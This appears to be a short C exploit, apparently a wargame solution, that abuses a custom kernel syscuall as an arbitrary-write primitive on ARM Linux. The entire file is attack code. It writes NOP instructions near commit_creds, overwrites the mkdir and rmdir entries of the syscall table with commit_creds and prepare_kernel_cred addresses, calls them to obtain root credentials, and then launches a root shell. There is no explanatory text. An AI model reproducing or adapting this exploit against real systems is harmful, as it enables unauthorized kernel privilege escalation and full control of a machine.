#include <stdio.h>

#define SYS_CALL_TABLE (0x8000e348)
#define NR_SYS_UPPER (223)
#define NR_SYS_MKDIR (39)
#define NR_SYS_RMDIR (40)
#define COMMIT_CREDS_NOP_SLIDE_ADDRESS (0x8003f560)
#define COMMIT_CREDS_NOP_SLIDE_ADDRESS_STR ("\x60\xf5\x03\x80")
#define PREPARE_KERNEL_CRED_ADDRESS_STR ("\x24\xf9\x03\x80")


unsigned int** sct;

int main(void)
{
    sct = (unsigned int**)SYS_CALL_TABLE;
    syscall(NR_SYS_UPPER, "\x01\x10\xa0\xe1\x01\x10\xa0\xe1\x01\x10\xa0\xe1", COMMIT_CREDS_NOP_SLIDE_ADDRESS);
    syscall(NR_SYS_UPPER, COMMIT_CREDS_NOP_SLIDE_ADDRESS_STR, &sct[NR_SYS_MKDIR]);
    syscall(NR_SYS_UPPER, PREPARE_KERNEL_CRED_ADDRESS_STR, &sct[NR_SYS_RMDIR]);
    syscall(NR_SYS_MKDIR, syscall(NR_SYS_RMDIR, 0));
    system("/bin/sh");

    return 0;
}
